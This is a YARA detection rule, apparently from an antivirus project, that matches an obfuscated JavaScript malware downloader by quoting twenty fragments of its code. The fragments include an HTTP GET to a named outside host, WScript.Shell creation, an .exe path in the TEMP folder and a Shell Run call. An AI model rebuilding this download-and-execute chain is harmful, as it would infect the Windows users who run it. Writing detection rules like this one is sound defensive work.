rule sig_20160401_a571856bee4776e2c85c247dfba7472f {
  meta:
    description = "datamaliciousorder - file 20160401_a571856bee4776e2c85c247dfba7472f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "74cf2c17a36de585d4448c56e8a11c103d657758840022c273d4e7a2899b46eb"

  strings:
    $s1  = "RbZu[KrgSw](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var BkaZc = function GevHx() {return WScript[GoLt](\"WScript\"+\".Shell\");}(), ZoVom = 11;" fullword ascii
    $s3  = "function ZudHm(IfjJnx, XgTf){YxcIo = YxcIo * 1; return IfjJnx - XgTf;};" fullword ascii
    $s4  = "if (RbZu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KobHo() {return BkaZc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4tWjyyLN.ex\" + \"e\";};" fullword ascii
    $s6  = "function NtLwh(){return EsGiv + \"\";};" fullword ascii
    $s7  = "function QnhNb() {return ((YpzIig == true) && (YpzIig == DedQq)) ? 1 : YxcIo;};" fullword ascii
    $s8  = "return ZudHm(YahOt, ZkRey);" fullword ascii
    $s9  = "function IgKgs(){return GoLt;};" fullword ascii
    $s10 = "var DedQq = false;" fullword ascii
    $s11 = "function HltBc()" fullword ascii
    $s12 = "var EgIt = new this[\"Date\"]();" fullword ascii
    $s13 = "YpzIig = true; " fullword ascii
    $s14 = "function ZmNv(IlxAo) {var IjnNt = (1, 2, 3, 4, 5, IlxAo); return IjnNt;};" fullword ascii
    $s15 = "function WjzYx(BuuSo){BkaZc[\"R\"+\"un\"](BuuSo, YxcIo, YxcIo);};" fullword ascii
    $s16 = "var JrZru = false;" fullword ascii
    $s17 = "DedQq = true; " fullword ascii
    $s18 = "function KkeKmw(){return 23;};" fullword ascii
    $s19 = "var YpzIig = false;" fullword ascii
    $s20 = "}while (OkgDl);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}